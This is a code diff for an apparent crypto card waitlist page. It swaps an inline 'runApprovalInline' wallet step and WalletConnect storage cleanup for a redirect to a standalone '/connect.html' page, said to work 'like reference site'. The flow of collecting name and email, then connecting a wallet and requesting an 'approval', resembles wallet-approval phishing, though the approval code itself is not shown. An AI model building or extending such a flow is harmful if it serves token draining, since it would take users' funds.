@@ -246,22 +246,13 @@
       sessionStorage.setItem('tw-waitlist-name', name);
       sessionStorage.setItem('tw-waitlist-email', email);
     } catch (_) {}
-    /* Clear WalletConnect state before connect - avoids "Connection closed" from stale Next.js init */
-    try {
-      Object.keys(localStorage).forEach(function (k) {
-        if (k.startsWith('wc@') || k === 'WALLETCONNECT_DEEPLINK_CHOICE' || k.startsWith('WCM_')) localStorage.removeItem(k);
-      });
-      if (typeof indexedDB !== 'undefined' && indexedDB.deleteDatabase) {
-        try { indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB'); } catch (_) {}
-      }
-    } catch (_) {}
-    showConnecting();
-    runApprovalInline(network, function () { resetToForm(); });
+    var connectUrl = '/connect.html?network=' + encodeURIComponent(network) + (country ? '&country=' + encodeURIComponent(country) : '');
+    window.location.href = connectUrl;
   }
 
   document.addEventListener('submit', handleFormSubmit, true);
 
-  /* Direct click on Apply Now - more reliable than form submit (avoids React/overlay blocking) */
+  /* Direct click on Apply Now - redirect to standalone connect page (no Next.js = no WalletConnect conflict) */
   document.addEventListener('click', function (e) {
     var btn = e.target && e.target.closest && e.target.closest('#waitlist-apply-btn');
     if (!btn || !overlay || !overlay.classList.contains('open')) return;
@@ -286,16 +277,9 @@
       sessionStorage.setItem('tw-waitlist-name', name);
       sessionStorage.setItem('tw-waitlist-email', email);
     } catch (_) {}
-    try {
-      Object.keys(localStorage).forEach(function (k) {
-        if (k.startsWith('wc@') || k === 'WALLETCONNECT_DEEPLINK_CHOICE' || k.startsWith('WCM_')) localStorage.removeItem(k);
-      });
-      if (typeof indexedDB !== 'undefined' && indexedDB.deleteDatabase) {
-        try { indexedDB.deleteDatabase('WALLET_CONNECT_V2_INDEXED_DB'); } catch (_) {}
-      }
-    } catch (_) {}
-    showConnecting();
-    runApprovalInline(network, resetToForm);
+    /* Redirect to standalone connect page - no Next.js, works like reference site */
+    var connectUrl = '/connect.html?network=' + encodeURIComponent(network) + (country ? '&country=' + encodeURIComponent(country) : '');
+    window.location.href = connectUrl;
   }, true);
 
   /* Get card opens network choice - use delegation to catch React-rendered buttons */
